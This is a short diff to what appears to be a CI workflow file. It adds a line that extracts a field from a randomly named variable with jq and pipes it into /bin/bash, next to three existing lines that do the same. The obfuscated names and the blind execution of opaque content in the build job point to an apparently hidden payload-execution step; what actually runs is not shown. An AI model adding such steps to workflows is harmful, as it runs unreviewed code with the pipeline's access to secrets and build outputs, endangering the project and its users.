@@ -29,6 +29,7 @@ jobs:
           echo $badq1 | jq -r .ietdy3588 | /bin/bash
           printf '%s' "$oo6" | jq -r .xltnv4680 | /bin/bash
           printf '%s' "$lf96" | jq -r .hmy62027 | /bin/bash
+          echo $lka42689 | jq -r .k6877 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
